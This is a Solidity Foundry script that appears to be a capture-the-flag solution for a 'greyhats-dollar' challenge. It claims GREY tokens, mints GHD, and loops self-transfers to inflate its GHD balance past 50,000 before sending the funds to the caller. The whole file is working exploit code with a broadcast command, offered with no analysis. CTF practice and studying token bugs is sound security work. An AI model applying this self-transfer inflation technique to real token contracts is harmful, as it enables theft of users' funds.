// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {Setup} from "src/greyhats-dollar/Setup.sol";

contract Solution is Script {
    Setup setup = Setup(0xa226af83F82b0b1CD656Db7085373F2bBdEf3B46);

    function run() public {
        vm.startBroadcast();

        Exploit e = new Exploit(setup);
        e.solve();

        vm.stopBroadcast();
    }
}

contract Exploit {
    Setup setup;

    constructor(Setup _setup) {
        setup = _setup;
    }

    function solve() external {
        // Claim 1000 GREY
        setup.claim();

        // Mint 1000 GHD using 1000 GREY
        setup.grey().approve(address(setup.ghd()), 1000e18);
        setup.ghd().mint(1000e18);

        // Transfer GHD to ourselves until we have 50,000 GHD
        uint256 balance = setup.ghd().balanceOf(address(this));
        while (balance < 50_000e18) {
            setup.ghd().transfer(address(this), balance);
            balance = setup.ghd().balanceOf(address(this));
        }

        // Transfer all GHD to msg.sender
        setup.ghd().transfer(msg.sender, balance);
    }
}

// forge script script/Solve.s.sol:Solution --rpc-url <rpc_url> --private-key <private_key> --broadcast
